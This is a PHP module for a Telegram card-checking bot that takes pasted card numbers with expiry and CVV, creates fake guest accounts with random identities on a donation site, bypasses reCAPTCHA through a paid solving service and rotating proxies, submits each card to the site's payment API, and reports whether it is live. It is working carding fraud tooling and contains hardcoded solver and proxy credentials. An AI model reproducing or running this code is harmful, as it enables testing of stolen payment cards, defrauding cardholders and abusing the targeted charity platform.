<?php
require_once __DIR__ . '/../common.php';
if(cmd($message, "kl")){
    is_duro();
$NameGater ='Kali';
$gateway = "/kl $NameGater";

is_gateroff($NameGater); //off Gater
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Stripe Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!kl card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

AntiScript();
is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>
"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();



$encryption = new Encryptions();

$encryption->setData([
    "adyenkey" => "10001|CB416919812EC5ACA088655B3B974D3F35BE5D7AB728466D53FBF6618DDE6AA20A6EB97749AAD36AC5A6A997D7198AFFF860F57A955F7F61F0BC0443E0AC3AB0F5270487AAFEF77EED987A30BFBEB451159E7C52CEE102969295BE17788C073CE15058A747A556CB1F41202B16A70A852302A236C04BB33AC8A732A630F72A2AEC31E446FAA1497EF730C93134E5C624E8C8CB5998DFE257884D76E511B6A2120335C5653559A8DF2BA67BCF67D40B7AAE6025D7A7FAACF967CBC5616AE433BBEA0A11943A39E65C8F9DD0BB2A25663E9C3F70B7C4E4A74E9BC5EA340F9C0C9D017D290E530B4D2A8F2564F85B12DE45E3318FEDEF9D469038C3DC5528E41D45",
    "card" => $cc,
    "month" => $mes,
    "year" => $ano,
    "cvv" => $cvv,
]);
$encryption->setAdyenVersion('v2');
$encryption->execute();
$response = $encryption->getResponse();
$encryptedData = $response['encryptedData'];

$encryptedCardNumber = $encryptedData['encryptedCardNumber'];
$encryptedExpiryMonth = $encryptedData['encryptedExpiryMonth'];
$encryptedExpiryYear = $encryptedData['encryptedExpiryYear'];
$encryptedSecurityCode = $encryptedData['encryptedSecurityCode'];





$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 12);

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];


$cookies = tempnam(sys_get_temp_dir(), 'cookie');


$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos

$socks5 = "all.dc.smartproxy.com:10000";
$rotate = "Testingthis123:Testingpassword12+";

if(strlen($ano) == 2 ){
    $ano = "20".$ano;
}

if ($mes < 10) {
    $mes = substr($mes, -1);
}



while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

        $headers = [
            'accept: application/json',
            'accept-language: es-ES,es;q=0.9',
            'cache-control: max-age=0',
            'content-type: application/json',
            'origin: https://www.launchgood.com',
            'referer: https://www.launchgood.com/v4/checkout/donate__so_that_we_can_illustrate_2?redirectURL=https%3A%2F%2Fwww.launchgood.com%2Fv4%2Fthankyou%2Fdonate__so_that_we_can_illustrate_2&type=rebuild',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
        ];
        $data = '{"verb":"create","email":"'.$email.'","name":"'.$firstname.' '.$lastname.'"}';
        $req2 = $curl::Post('https://www.launchgood.com/api/user/guest', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }
        $data = json_decode($req2->body, true);
        $id = $data["result"]["id"];
        $token = $data["result"]["token"];
        $hash = $data["result"]["hash"];


        $solution = $solver->recaptchaV2(
            \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
            [
              'websiteURL'    => 'https://www.launchgood.com/',
              'websiteKey'    => '6Ley5qwnAAAAAAdIr6J50NYpwowkfq2duR5Lxs7I',
            ]
        );
        $captcha = $solution["gRecaptchaResponse"];


        $option = [
            '5' => 'mastercard',
            '4' => 'visa',
            '3' => 'amex',
            '6' => 'discover',

        ];
        $branddd = urlencode($option[substr($cc ,0,1)]);

        $headers = [
            'Accept-Language: es-ES,es;q=0.9',
            'Connection: keep-alive',
            'Origin: https://www.launchgood.com',
            'Referer: https://www.launchgood.com/',
            'Sec-Fetch-Dest: empty',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Site: same-site',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'accept: application/json',
            'content-type: application/json',
        ];
        $data = '{"verb":"add","tokens":[{"token":{"paymentMethod":{"type":"scheme","holderName":"'.$firstname.' '.$lastname.'","encryptedCardNumber":"'.$encryptedCardNumber.'","encryptedExpiryMonth":"'.$encryptedExpiryMonth.'","encryptedExpiryYear":"'.$encryptedExpiryYear.'","encryptedSecurityCode":"'.$encryptedSecurityCode.'","brand":"'.$branddd.'","checkoutAttemptId":"d0ba1c42-b28a-4890-b20e-652d780a949b17207371091875297CAD52AD2BC550206C52B39E65B7ABF75E1C0CAC3DB6AECFE3900693F3C41"}},"type":"adyen-mounted","digest":"'.$branddd.'|XXXX|032030"}],"billingAddress":{"Name":"'.$firstname.' '.$lastname.'","Address":"'.$street.'","Address2":"","City":"'.$city.'","State":"'.$regioncode.'","Zip":"'.$zip.'","Country":"US"},"saveCard":false,"giftAid":false,"reCaptcha":"'.$captcha.'","guest":{"type":"new-guest","id":'.$id.',"isGuest":true,"hash":"'.$hash.'"},"userID":'.$id.'}';
        $req2 = $curl::Post('https://api.launchgood.com/v3/api/user/cards', $data, $headers, $cookie, $server);
        if (!$req2->success) {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $data = json_decode($req2->body, true);
        $message = $data["message"];
        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            echo "Intento $retries: " . $e->getMessage() . "\n" ;
            return;
        }
    }
}

$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);

bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);

if(substr_count($req2->body, 'CVC Declined') || substr_count($req2->body, 'CVC declined') ){
$status = "APPROVED ✅";
$response = "$message";
}elseif(substr_count($req2->body, 'Not enough balance')){
$status = "APPROVED ✅";
$response = "$message";
}elseif(substr_count($req2->body, '"Address":{},"id":')){
$status = "APPROVED ✅";
$response = "CHARGED 1$";
}else{
$status = "DECLINED ❌";
$response = "$message";
}

file_put_contents("resp.txt",$curl);

   bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

$free = antispFree($gId);
$premi = antisppre($gId);

}
